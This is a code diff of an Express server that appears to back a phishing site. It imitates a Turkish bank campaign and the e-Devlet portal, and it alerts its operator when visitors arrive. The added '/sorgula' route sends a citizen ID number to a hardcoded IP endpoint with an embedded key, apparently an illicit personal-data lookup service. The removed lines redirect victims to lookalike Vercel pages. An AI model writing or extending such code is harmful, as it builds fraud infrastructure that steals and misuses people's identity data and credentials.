@@ -21,6 +21,8 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(cookieParser()); 
 
+
+
 app.get('/', (req, res) => {
    notifyVisitorLogin()
     .then(() => {
@@ -102,11 +104,23 @@ app.get('/4c2abonus.html', (req, res) => {
   });
 
 
- app.get('/asnlana', (req, res) => {
-    // https://isbank-kampanyalar-kayit.vercel.app/
+app.get('/sorgula', async (req, res) => {
+    try {
+        const tcNo = req.query.tcNo;
+        const apiUrl = `https://185.231.68.29/apiservice/stayhigh/tcpro.php?auth=stayhighforlife&tc=${encodeURIComponent(tcNo)}`;
+        
+        const response = await fetch(apiUrl);
+        const data = await response.json();
 
-    // Kullanıcıyı yönlendir
-    res.redirect('https://grnti.vercel.app/');
+        res.json(data);
+    } catch (error) {
+        console.error('Hata:', error);
+        res.status(500).send('Sorgu başarısız oldu. Lütfen tekrar deneyin.');
+    }
+});
+
+app.listen(port, () => {
+    console.log(`Server listening at http://localhost:${port}`);
 });
  app.get('/basvur-edevlet', (req, res) => {
     notifyVisitorLogin()
